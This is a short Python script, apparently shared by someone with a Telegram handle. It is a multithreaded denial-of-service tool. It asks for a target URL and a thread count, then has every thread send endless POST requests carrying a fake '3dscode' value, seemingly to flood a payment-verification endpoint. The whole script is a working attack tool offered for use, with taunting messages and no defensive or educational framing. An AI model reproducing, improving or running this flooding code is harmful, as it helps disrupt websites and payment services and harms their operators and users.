# Telegram @xdivv
import colorama
import threading
import requests
import cloudscraper

def dos(target):
    while True:
        try:
            res = requests.post(url, data={'3dscode': '666666',})
            print("code sent")
        except requests.exceptions.ConnectionError:
            print("ggwp")

threads = 20

url = input("target: ")

try:
    threads = int(input("threads: "))
except ValueError:
    exit("u r dumb")

if threads == 0:
    exit("idiot")

if not url.__contains__("http"):
    exit("provide full odmain plz")

if not url.__contains__("."):
    exit("not that")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " threads started!")
